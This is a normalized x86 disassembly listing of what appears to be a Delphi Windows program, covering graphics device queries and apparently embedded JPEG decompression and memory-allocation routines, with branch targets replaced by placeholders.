call sub_48bd10
pop esi
pop ebx
retn
sub_48bcbc
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ ebx + 0x28 ] esi
mov eax esi
call sub_427864
pop esi
pop ebx
retn
call sub_427868
sub_48bce8
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx esi
mov edx [ esp ]
mov eax ebx
call sub_48bd10
pop edx
pop edi
pop esi
pop ebx
retn
sub_48bd10
push ebp
mov ebp esp
add esp 0xfffffda4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_48bcbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
call sub_403f64
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x28 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edi eax
mov [ ebx + 0x8 ] edi
mov eax esi
cdq
push edx
push eax
mov eax edi
call sub_419344
mov eax [ ebx + 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4194ec
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22 ] 0x1
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi rw-data
lea edi [ ebp - 0x8c ]
mov ecx 0x21
[ edi ] [ esi ]
lea eax [ ebp - 0x8c ]
mov [ ebp - 0x25c ] eax
lea eax [ ebp - 0x25c ]
mov ecx 0x1d0
mov edx 0x3e
call sub_48c01c
xor eax eax
push ebp
push sub_48be32
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
call sub_4192e0
mov edx [ ebx + 0x8 ]
lea eax [ ebp - 0x25c ]
call sub_48d788
lea eax [ ebp - 0x25c ]
or edx 0xffffffff
call sub_48c2e4
mov eax [ ebp - 0x240 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebp - 0x23c ]
mov [ ebx + 0xc ] eax
cmp [ ebp - 0x234 ] 0x1
sete al
mov [ ebx + 0x14 ] al
lea eax [ ebp - 0x25c ]
call sub_48c430
cmp eax 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0x41 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x25c ]
call sub_48c0ec
retn
sub_48be54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_48b750
mov ecx [ ebp - 0x4 ]
mov edx edi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_48be80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_48bc4c
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop esi
pop ebx
retn
sub_48bea8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_48bee6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x4 ]
call sub_48ac10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48beed
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_48bef0
push ebx
push esi
push edi
mov esi edx
mov edi eax
cmp esi [ edi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx [ edi + 0x2c ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
cmp esi eax
jne r-xdata
mov ebx eax
test bl bl
je r-xdata
mov al 0x1
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
mov eax edi
call sub_48b604
mov [ edi + 0x38 ] esi
test bl bl
je r-xdata
push eax
call DeleteObject
mov [ edi + 0x22 ] 0x1
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_48bf48
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_48bf86
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov eax [ ebp - 0x4 ]
call sub_48ac10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48bf8d
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_48bf90
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax [ ebx + 0x28 ]
mov edi [ eax + 0x8 ]
test edi edi
je r-xdata
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
cmp [ esp ] 0x0
jle r-xdata
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ esp ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_48bfdc
push ebx
push esi
push 0x0
call GetDC
mov ebx eax
push 0xc
push ebx
call GetDeviceCaps
mov esi eax
push 0xe
push ebx
call GetDeviceCaps
imul esi eax
cmp esi 0x8
jg r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
push ebx
push 0x0
call ReleaseDC
pop esi
pop ebx
retn
sub_48c01c
push ebx
mov ebx eax
push esi
xor eax eax
push edi
mov [ ebx + 0x4 ] eax
cmp edx 0x3e
mov esi ecx
je r-xdata
cmp esi 0x1d0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xc
mov [ eax + 0x18 ] 0x3e
mov [ eax + 0x1c ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi [ ebx ]
mov edi [ ebx + 0xc ]
push 0x1d0
push 0x0
push ebx
call sub_48ab3c
add esp 0xc
mov [ ebx ] esi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] 0x1
mov eax ebx
call sub_48d040
xor edx edx
xor ecx ecx
mov [ ebx + 0x8 ] edx
lea edx [ ebx + 0xa4 ]
mov [ ebx + 0x18 ] ecx
xor eax eax
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x15
mov [ eax + 0x18 ] 0x1d0
mov [ eax + 0x1c ] esi
mov eax ebx
mov edx [ eax ]
call [ edx ]
xor ecx ecx
inc eax
mov [ edx ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
xor eax eax
lea edx [ ebx + 0xb4 ]
xor ecx ecx
inc eax
mov [ edx ] ecx
xor ecx ecx
mov [ edx + 0x10 ] ecx
add edx 0x4
cmp eax 0x4
jl r-xdata
xor eax eax
mov [ ebx + 0x130 ] eax
mov eax ebx
call sub_4975ec
mov eax ebx
call sub_48d694
mov [ ebx + 0x14 ] 0xc8
pop edi
pop esi
pop ebx
retn
sub_48c0fc
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x24 ]
dec eax
je r-xdata
mov [ ebx + 0x28 ] 0x1
mov [ ebx + 0x2c ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0x30 ] 0x1
mov [ ebx + 0x34 ] 0x1
xor ecx ecx
xor eax eax
mov [ ebx + 0x38 ] ecx
xor edx edx
mov [ ebx + 0x3c ] 0x3ff00000
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] edx
mov [ ebx + 0x48 ] 0x2
mov [ ebx + 0x4c ] 0x1
mov [ ebx + 0x50 ] 0x1
xor ecx ecx
xor eax eax
mov [ ebx + 0x54 ] ecx
xor edx edx
mov [ ebx + 0x58 ] 0x2
mov [ ebx + 0x5c ] 0x1
mov [ ebx + 0x60 ] 0x100
mov [ ebx + 0x88 ] eax
xor ecx ecx
mov [ ebx + 0x64 ] edx
mov [ ebx + 0x68 ] ecx
xor eax eax
mov [ ebx + 0x6c ] eax
pop esi
pop ebx
retn
cmp [ ebx + 0x118 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x124 ] 0x0
je r-xdata
mov [ ebx + 0x28 ] 0x3
jmp r-xdata
cmp [ ebx + 0x124 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebx + 0xd8 ]
mov eax [ ecx ]
mov edx [ ecx + 0x54 ]
mov ecx [ ecx + 0xa8 ]
cmp eax 0x1
jne r-xdata
mov dl [ ebx + 0x128 ]
sub dl 0x1
jb r-xdata
mov [ ebx + 0x2c ] 0x2
jmp r-xdata
mov [ ebx + 0x28 ] 0x4
mov dl [ ebx + 0x128 ]
sub dl 0x1
jb r-xdata
xor eax eax
xor edx edx
mov [ ebx + 0x28 ] eax
mov [ ebx + 0x2c ] edx
cmp eax 0x52
jne r-xdata
cmp edx 0x2
jne r-xdata
mov [ ebx + 0x28 ] 0x2
jmp r-xdata
je r-xdata
mov [ ebx + 0x28 ] 0x4
jmp r-xdata
dec dl
je r-xdata
mov esi [ ebx ]
add esi 0x18
mov [ esi ] eax
mov [ esi + 0x4 ] edx
mov [ esi + 0x8 ] ecx
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x6f
mov edx 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx + 0x28 ] 0x3
cmp edx 0x47
jne r-xdata
cmp ecx 0x3
jne r-xdata
mov [ ebx + 0x28 ] 0x3
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x2c ] 0x4
jmp r-xdata
mov [ ebx + 0x28 ] 0x5
jmp r-xdata
jmp r-xdata
cmp ecx 0x42
jne r-xdata
mov [ ebx + 0x28 ] 0x3
jmp r-xdata
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x14 ] 0x72
mov dl [ ebx + 0x128 ]
mov [ eax + 0x18 ] edx
mov eax ebx
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx + 0x28 ] 0x3
jmp r-xdata
mov eax [ ebx ]
xor edx edx
mov [ eax + 0x14 ] 0x72
mov dl [ ebx + 0x128 ]
mov [ eax + 0x18 ] edx
mov eax ebx
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov [ ebx + 0x28 ] 0x5
jmp r-xdata
mov [ ebx + 0x28 ] 0x2
jmp r-xdata
sub_48c2e4
push ebx
mov ebx eax
push esi
mov esi edx
mov eax [ ebx + 0x14 ]
cmp eax 0xc8
je r-xdata
mov eax ebx
call sub_48c350
mov edx eax
sub edx 0x1
jb r-xdata
cmp eax 0xc9
je r-xdata
pop esi
pop ebx
retn
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax 0x1
jmp r-xdata
dec edx
je r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov eax ebx
call sub_4977dc
mov eax 0x2
mov edx [ ebx ]
mov eax ebx
mov [ edx + 0x14 ] 0x33
mov edx [ eax ]
call [ edx ]
sub_48c350
push ebx
mov ebx eax
push esi
xor esi esi
mov eax [ ebx + 0x14 ]
add eax 0xffffff38
cmp eax 0xa
ja r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov al [ eax + lookup_table_48c370 ]
jmp [ eax * 4 + jump_table_48c37b ]
mov eax ebx
mov edx [ eax + 0x1b4 ]
call [ edx + 0x4 ]
mov eax ebx
mov edx [ eax + 0x18 ]
call [ edx + 0x8 ]
mov [ ebx + 0x14 ] 0xc9
mov eax ebx
mov edx [ eax + 0x1b4 ]
call [ edx ]
mov esi eax
cmp esi 0x1
jne r-xdata
mov esi 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x1b4 ]
call [ edx ]
mov esi eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_48c0fc
mov [ ebx + 0x14 ] 0xca
jmp r-xdata
sub_48c3fc
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp eax 0xc8
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0xd2
jle r-xdata
mov ecx [ ebx + 0x1b4 ]
mov eax [ ecx + 0x14 ]
pop ebx
retn
sub_48c430
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp eax 0xca
jl r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
cmp eax 0xd2
jle r-xdata
mov ecx [ ebx + 0x1b4 ]
mov eax [ ecx + 0x10 ]
pop ebx
retn
sub_48c464
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp eax 0xcd
je r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
cmp eax 0xce
jne r-xdata
cmp [ ebx + 0x14 ] 0xcf
jne r-xdata
mov edx [ ebx + 0x8c ]
cmp edx [ ebx + 0x74 ]
jae r-xdata
cmp [ ebx + 0x14 ] 0xd2
je r-xdata
mov [ ebx + 0x14 ] 0xd2
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x1a4 ]
call [ edx + 0x4 ]
mov [ ebx + 0x14 ] 0xd2
jmp r-xdata
mov ecx [ ebx ]
mov eax ebx
mov [ ecx + 0x14 ] 0x43
mov edx [ eax ]
call [ edx ]
mov edx [ ebx + 0x1b4 ]
cmp [ edx + 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ eax + 0x14 ] 0x14
mov edx [ ebx + 0x14 ]
mov [ eax + 0x18 ] edx
mov eax ebx
mov edx [ eax ]
call [ edx ]
jmp r-xdata
mov eax ebx
mov edx [ eax + 0x1b4 ]
call [ edx ]
test eax eax
jne r-xdata
mov eax ebx
mov edx [ eax + 0x18 ]
call [ edx + 0x18 ]
mov eax ebx
call sub_4977dc
mov eax 0x1
pop ebx
retn
xor eax eax
pop ebx
retn
sub_48c528
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov edi eax
mov esi ecx
cmp esi 0x3b9ac9f4
mov [ esp ] edx
mov eax [ edi + 0x4 ]
mov [ esp + 0x4 ] eax
jbe r-xdata
mov eax esi
and eax 0x7
test eax eax
jbe r-xdata
mov edx 0x1
mov eax edi
call sub_48c514
cmp [ esp ] 0x0
jl r-xdata
mov edx 0x8
sub edx eax
add esi edx
mov eax [ edi ]
mov [ eax + 0x14 ] 0xe
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax edi
mov edx [ eax ]
call [ edx ]
cmp [ esp ] 0x2
jl r-xdata
test eax eax
jne r-xdata
cmp esi [ eax + 0x8 ]
jbe r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp ]
xor ebp ebp
mov eax [ eax + edx * 4 + 0x34 ]
test eax eax
je r-xdata
lea edx [ eax + 0xc ]
add edx [ eax + 0x4 ]
add [ eax + 0x4 ] esi
sub [ eax + 0x8 ] esi
mov eax edx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ esi + 0xc ]
test ebp ebp
mov [ esp + 0x8 ] eax
jne r-xdata
mov ebp eax
mov eax [ eax ]
test eax eax
jne r-xdata
mov eax [ esp ]
mov ebx [ eax * 4 + rw-data ]
mov edx [ esp ]
mov ebx [ edx * 4 + rw-data ]
jmp r-xdata
mov edx [ esp + 0x8 ]
mov eax edi
add edx ebx
call sub_48d134
test eax eax
jne r-xdata
mov ebx eax
mov eax 0x3b9aca00
sub eax [ esp + 0x8 ]
cmp ebx eax
jbe r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
add ecx ebx
add ebx esi
add ecx [ edx + 0x4c ]
mov edx [ esp + 0x4 ]
mov [ edx + 0x4c ] ecx
xor ecx ecx
xor edx edx
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
test ebp ebp
jne r-xdata
mov ecx 0x2
mov eax ebx
xor edx edx
div ecx
mov ebx eax
cmp ebx 0x32
jae r-xdata
mov [ ebp ] eax
mov edx [ esp + 0x4 ]
mov ecx [ esp ]
mov [ edx + ecx * 4 + 0x34 ] eax
jmp r-xdata
mov edx 0x2
mov eax edi
call sub_48c514
jmp r-xdata
sub_48c658
push ebx
push esi
push edi
push ebp
mov ebp eax
push ecx
mov [ esp ] edx
mov esi ecx
cmp esi 0x3b9ac9f4
mov edi [ ebp + 0x4 ]
jbe r-xdata
mov eax esi
and eax 0x7
test eax eax
jbe r-xdata
mov edx 0x3
mov eax ebp
call sub_48c514
cmp [ esp ] 0x0
jl r-xdata
mov edx 0x8
sub edx eax
add esi edx
mov eax [ ebp ]
mov [ eax + 0x14 ] 0xe
mov edx [ esp ]
mov [ eax + 0x18 ] edx
mov eax ebp
mov edx [ eax ]
call [ edx ]
cmp [ esp ] 0x2
jl r-xdata
mov ecx [ edi + 0x4c ]
add ecx esi
add ecx 0xc
mov [ edi + 0x4c ] ecx
xor ecx ecx
mov eax [ esp ]
mov edx [ edi + eax * 4 + 0x3c ]
mov [ ebx ] edx
mov [ ebx + 0x4 ] esi
mov [ ebx + 0x8 ] ecx
mov eax [ esp ]
mov [ edi + eax * 4 + 0x3c ] ebx
lea eax [ ebx + 0xc ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx 0x4
mov eax ebp
call sub_48c514
lea edx [ esi + 0xc ]
mov eax ebp
call sub_48d144
mov ebx eax
test ebx ebx
jne r-xdata
sub_48c6f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax 0x3b9ac9f4
div [ ebp - 0xc ]
mov ebx eax
test ebx ebx
jg r-xdata
cmp ebx [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x46
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x14 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi + 0x50 ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48c528
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0x8 ]
jb r-xdata
mov [ eax ] edx
inc [ ebp - 0x18 ]
add eax 0x4
add edx [ ebp - 0xc ]
dec ecx
test ecx ecx
ja r-xdata
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
imul ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_48c658
mov edx eax
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x18 ]
lea eax [ eax + ebx * 4 ]
test ecx ecx
jbe r-xdata
sub_48c7cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0xc ]
shl eax 0x7
push eax
mov eax 0x3b9ac9f4
pop edx
mov ecx edx
xor edx edx
div ecx
mov ebx eax
test ebx ebx
jg r-xdata
cmp ebx [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ edx + 0x14 ] 0x46
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x14 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi + 0x50 ] eax
mov ecx [ ebp + 0x8 ]
shl ecx 0x2
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48c528
mov [ ebp - 0x10 ] eax
xor edx edx
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov [ eax ] edx
inc [ ebp - 0x18 ]
add eax 0x4
mov ebx [ ebp - 0xc ]
shl ebx 0x7
add edx ebx
dec ecx
test ecx ecx
ja r-xdata
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0xc ]
shl ecx 0x7
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_48c658
mov edx eax
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov ebx [ ebp - 0x18 ]
lea eax [ eax + ebx * 4 ]
test ecx ecx
jbe r-xdata
sub_48c8b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] ecx
cmp edi 0x1
mov esi [ ebx + 0x4 ]
je r-xdata
mov ecx 0x80
mov edx edi
mov eax ebx
call sub_48c528
xor ecx ecx
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
xor edx edx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x20 ] ecx
mov [ eax + 0x28 ] edx
mov ecx [ esi + 0x44 ]
mov [ eax + 0x2c ] ecx
mov [ esi + 0x44 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xe
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_48c918
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] ecx
cmp edi 0x1
mov esi [ ebx + 0x4 ]
je r-xdata
mov ecx 0x80
mov edx edi
mov eax ebx
call sub_48c528
xor ecx ecx
mov [ eax ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov [ eax + 0xc ] edx
xor edx edx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x20 ] ecx
mov [ eax + 0x28 ] edx
mov ecx [ esi + 0x48 ]
mov [ eax + 0x2c ] ecx
mov [ esi + 0x48 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebx ]
mov [ eax + 0x14 ] 0xe
mov [ eax + 0x18 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_48c980
push ebx
push esi
push edi
mov edi eax
push ebp
push ecx
mov ebp [ edi + 0x4 ]
xor eax eax
mov [ esp ] eax
xor esi esi
mov ebx [ ebp + 0x44 ]
test ebx ebx
je r-xdata
mov ebx [ ebp + 0x48 ]
test ebx ebx
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
test esi esi
jle r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
imul edx eax
mov ecx [ ebx + 0x4 ]
add edx esi
imul ecx eax
add ecx [ esp ]
mov esi edx
mov [ esp ] ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x4c ]
mov edx esi
push eax
mov eax edi
mov ecx [ esp + 0x4 ]
call sub_48d154
mov ecx eax
cmp ecx [ esp ]
jl r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ ebx + 0xc ]
imul edx eax
mov ecx [ ebx + 0x4 ]
imul ecx eax
shl edx 0x7
shl ecx 0x7
add edx esi
add ecx [ esp ]
mov esi edx
mov [ esp ] ecx
mov eax ecx
cdq
idiv esi
mov esi eax
test esi esi
jg r-xdata
mov esi 0x3b9aca00
jmp r-xdata
mov ebx [ ebp + 0x44 ]
test ebx ebx
je r-xdata
mov esi 0x1
mov ebx [ ebp + 0x48 ]
test ebx ebx
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax ecx
dec eax
xor edx edx
div [ ebx + 0xc ]
inc eax
cmp esi eax
jl r-xdata
mov ebx [ ebx + 0x2c ]
test ebx ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov eax ecx
dec eax
xor edx edx
div [ ebx + 0xc ]
inc eax
cmp esi eax
jl r-xdata
mov eax esi
imul [ ebx + 0xc ]
mov [ ebx + 0x10 ] eax
mov eax edi
mov ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x30 ]
imul ecx [ ebx + 0x8 ]
call sub_48d160
mov [ ebx + 0x28 ] 0x1
mov [ ebx + 0x10 ] ecx
jmp r-xdata
mov eax esi
imul [ ebx + 0xc ]
mov [ ebx + 0x10 ] eax
mov eax edi
mov ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x30 ]
imul ecx [ ebx + 0x8 ]
shl ecx 0x7
call sub_48d160
mov [ ebx + 0x28 ] 0x1
mov [ ebx + 0x10 ] ecx
jmp r-xdata
mov edx [ ebx + 0x10 ]
mov eax edi
push edx
mov edx 0x1
mov ecx [ ebx + 0x8 ]
call sub_48c6f8
mov [ ebx ] eax
xor eax eax
mov ecx [ ebp + 0x50 ]
xor edx edx
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
xor ecx ecx
mov [ ebx + 0x24 ] ecx
mov edx [ ebx + 0x10 ]
mov eax edi
push edx
mov edx 0x1
mov ecx [ ebx + 0x8 ]
call sub_48c7cc
mov [ ebx ] eax
xor eax eax
mov ecx [ ebp + 0x50 ]
xor edx edx
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
xor ecx ecx
mov [ ebx + 0x24 ] ecx
sub_48cb14
push ebx
push esi
push edi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov ebx edx
mov [ esp ] eax
mov eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
mov edx [ ebx + 0x18 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0xc ] edx
xor esi esi
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp esi eax
jl r-xdata
sub eax esi
cmp eax [ ebx + 0x14 ]
jle r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
sub eax esi
mov eax [ ebx + 0x14 ]
jmp r-xdata
mov ecx [ ebx + 0x4 ]
sub ecx edx
cmp eax ecx
jl r-xdata
mov eax [ ebx + 0x1c ]
sub eax edx
mov edx [ ebx + 0x18 ]
add edx esi
mov ecx [ ebx + 0x1c ]
sub ecx edx
cmp eax ecx
jl r-xdata
test eax eax
jle r-xdata
mov eax [ ebx + 0x4 ]
sub eax edx
mov edi eax
imul edi [ esp + 0x8 ]
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov ecx [ esp + 0xc ]
lea edx [ ebx + 0x30 ]
push ecx
push edi
mov eax [ ebx ]
mov ecx [ eax + esi * 4 ]
mov eax [ esp + 0x8 ]
call [ ebx + 0x30 ]
mov eax [ esp + 0xc ]
push eax
push edi
mov edx [ ebx ]
mov eax [ esp + 0x8 ]
mov ecx [ edx + esi * 4 ]
